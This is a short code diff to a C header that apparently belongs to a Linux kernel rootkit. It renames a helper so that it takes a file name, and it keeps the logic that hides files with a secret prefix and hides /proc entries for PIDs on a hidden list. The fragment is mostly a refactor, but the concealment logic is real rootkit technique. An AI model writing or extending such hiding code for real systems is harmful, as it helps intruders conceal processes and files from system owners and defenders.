@@ -71,9 +71,9 @@ extern struct list_head hidden_pids_list; // Head of the hidden PIDs linked list
 
 /**
  * Gets the effective PID for the given PID.
- * If the given PID is 0, return the current PID.
- * If the given PID is -1 or INT_MIN, return -1.
- * If the given PID is < -1, return the absolute value.
+ * If it is 0, return the current PID.
+ * If it is -1 or INT_MIN, return -1.
+ * If it is < -1, return the absolute value.
  * Otherwise, return the given PID.
  *
  * @param i32_pid The PID to get the effective PID for
@@ -118,24 +118,24 @@ bool is_pid_hidden(const pid_t i32_pid);
 /**
  * Does the given dirent structure need to be hidden?
  *
- * @param p_dirent The dirent structure
+ * @param s_filename      The file name
  * @param b_is_proc_child Is the dirent a child of /proc/?
  * @return `true` if the given dirent structure needs to be hidden, `false` otherwise
  */
-static inline bool is_dirent_hidden(const dirent64_t *const p_dirent, const bool b_is_proc_child)
+static inline bool is_file_hidden(const char *const s_filename, const bool b_is_proc_child)
 {
+    pid_t i32_pid = 0; // PID of the dirent
+
     // Check the name starts with the hidden prefix
-    IF_U (!strncmp(p_dirent->d_name, S_HIDDEN_PREFIX, HIDDEN_PREFIX_LEN)) {
+    IF_U (!strncmp(s_filename, S_HIDDEN_PREFIX, HIDDEN_PREFIX_LEN)) {
         return true;
     }
 
-    // If the dirent is a child of /proc/, first check if its name is a number
+    // If the file is a child of /proc/, first check if its name is a number
     // If it is, check if the corresponding PID is hidden
     IF_U (b_is_proc_child) {
-        pid_t i32_pid = 0; // PID of the dirent
-
         // Convert the name to a number
-        IF_U (kstrtoint(p_dirent->d_name, 10, &i32_pid)) {
+        IF_U (kstrtoint(s_filename, 10, &i32_pid)) {
             // If the name is not a number, this is not a PID, so we can return false
             return false;
         }
